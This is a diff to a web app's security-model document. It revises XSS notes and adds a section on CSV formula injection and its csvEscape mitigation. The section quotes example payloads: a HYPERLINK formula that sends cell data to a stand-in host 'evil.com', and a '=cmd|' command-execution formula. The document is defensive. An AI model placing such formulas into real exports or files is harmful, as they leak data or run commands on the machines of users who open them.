@@ -1,6 +1,6 @@
 # Security Model
 
-Last reviewed: 2026-05-05 (XSS coverage extended via 0bf1b90 — see XSS protections below)
+Last reviewed: 2026-05-05 (XSS coverage extended via 0bf1b90 + CSV formula-injection guard added — see CSV protections below)
 Prior audit: 2026-05-02 (fa18718)
 
 This document describes how authentication, authorization, and input handling work in
@@ -248,14 +248,43 @@ escaping pure CJK + emoji content is byte-identical (no `&<>"'` characters
 in the deterministic test fixtures).
 
 **Unescaped surfaces that may want defense-in-depth later:**
-- `playerCreateModal.js` — values come from form input, not API, so injection
-  surface is the user's own input. Lower risk but could be added for parity.
-- `exportHandlers.js` — TXT/CSV exports concatenate names; CSV escape is done
-  but TXT and PNG aren't HTML, so the risk is different (CSV injection,
-  Excel formula injection).
+- `playerCreateModal.js` — interpolations are from hardcoded constants
+  (`ANIMAL_EMOJIS`, `getPlayStyles()` return), not user input or API. Form
+  `<input>` values never reach `innerHTML`. No actionable XSS surface;
+  parity-only escapes deferred.
 - `exportMobile.js` — Canvas `ctx.fillText` doesn't parse HTML, so XSS via
   injected markup isn't possible, but a long enough name could overflow the
   canvas. Length validation at the create endpoint already caps this.
+
+---
+
+## CSV protections
+
+CSV export (`src/export/exportHandlers.js`) goes through a single `csvEscape`
+chokepoint applied to every cell in every row. As of 2026-05-05 it handles
+both quoting and **CSV formula-injection** prevention.
+
+**The vector:** display names and tagline have no charset restriction in
+`api/players/_utils.js` `validatePlayerData` — `displayName: "=HYPERLINK(\"//evil.com/?x=\"&A1,\"Click\")"` is accepted at create time. When this name flows through the
+session into `playerRankStr` (`p.emoji + p.name`) and lands in a CSV cell,
+opening the CSV in Excel / Numbers / LibreOffice executes the formula — typically
+weaponized as a clickable phishing link or a `=cmd|'/c calc'!A1` command in
+older Excel.
+
+**The mitigation:** `csvEscape` checks the leading character against
+`/^[=+\-@\t\r]/` and prefixes with a single quote (`'`) before the standard
+RFC 4180 quote-wrap. The single-quote sigil tells spreadsheet apps "treat as
+text, do not parse as formula." This is the OWASP-recommended approach.
+
+**Coverage:** all CSV cells — both data rows (player rankings, team names,
+upgrade strings, A-level notes) and the header row (`${t1Name}级` etc., where
+team names are user-editable in config). 14-case standalone test confirms
+formula triggers prefix correctly, RFC 4180 quoting still applies on commas /
+newlines / double quotes, plain text + CJK + emoji content unchanged.
+
+TXT and PNG exports are not HTML and not spreadsheet-parsed (TXT is a Blob
+with `type: 'text/plain'`; PNG goes through `ctx.fillText` which only renders
+glyphs). No additional escaping needed there.
 
 ---
 
@@ -297,6 +326,7 @@ in the deterministic test fixtures).
 | `src/stats/statistics.js` | Apply escapeHtml *(2026-05-05 extension)* |
 | `src/ui/panelManager.js` | Apply escapeHtml *(2026-05-05 extension)* |
 | `src/share/votingManager.js` | Apply escapeHtml *(2026-05-05 extension)* |
+| `src/export/exportHandlers.js` | `csvEscape` formula-injection guard *(2026-05-05 extension)* |
 | `src/share/roomManager.js` | Use server-issued token |
 | `players.html` | Remove client-side admin password leak |
 | `CLAUDE.md` | Remove leaked password reference |
